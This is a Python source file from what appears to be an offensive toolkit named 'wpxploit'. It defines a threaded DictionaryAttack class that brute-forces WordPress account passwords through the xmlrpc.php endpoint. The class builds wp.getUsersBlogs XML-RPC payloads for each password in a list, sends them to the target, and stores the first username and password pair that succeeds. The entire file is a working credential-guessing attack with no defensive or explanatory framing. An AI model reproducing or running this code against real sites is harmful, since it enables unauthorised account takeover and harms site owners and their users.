from tqdm import tqdm
from threading import Thread, Event
from requests.exceptions import RequestException
from wpxploit.xmlrpc.requester import XmlrpcRequester, XmlrpcDoesNotExist
from wpxploit.general.interface import current_time


class DictionaryAttack(XmlrpcRequester, Thread):

    _signal = Event()
    _result = None

    def __init__(self, url: str, user_name: str, pass_word: list, timeout: int):
        self.url = url
        self.user_name = user_name
        self.pass_word = pass_word
        Thread.__init__(self)
        XmlrpcRequester.__init__(self, url, timeout)

        if self._get_status is False:
            raise XmlrpcDoesNotExist("/xmlrpc.php seems to be unavailable")

    @staticmethod
    def _create_payload(user_name: str, pass_word: str) -> str:
        payload = "<methodCall>"
        payload += "<methodName>wp.getUsersBlogs</methodName>"
        payload += "<params>"
        payload += "<param><value>{}</value></param>".format(user_name)
        payload += "<param><value>{}</value></param>".format(pass_word)
        payload += "</params>"
        payload += "</methodCall>"

        return payload

    def perform_attack(self):
        progress_bar = tqdm(
            desc=current_time(),
            total=self.pass_word.__len__(),
            dynamic_ncols=True
        )
        for pass_word in self.pass_word:
            try:
                payload = self._create_payload(self.user_name, pass_word)
                request = self._make_xmlrpc_request(payload)
                progress_bar.update()
                if self._stopped():
                    # stop the loop in the thread
                    break
                else:
                    if request is not None:
                        self._result = {}
                        self._result.__setitem__("user_name", self.user_name)
                        self._result.__setitem__("pass_word", pass_word)
                        self.stop()
                        break
            except RequestException as Err:
                tqdm.write(current_time() + f" Connection error due to {Err}")
                break

        progress_bar.close()

    def run(self):
        self.perform_attack()

    def join(self):
        Thread.join(self)
        return self._result

    def stop(self):
        # set to true to inform all the threads to stop
        self._signal.set()

    def _stopped(self):
        return self._signal.is_set()
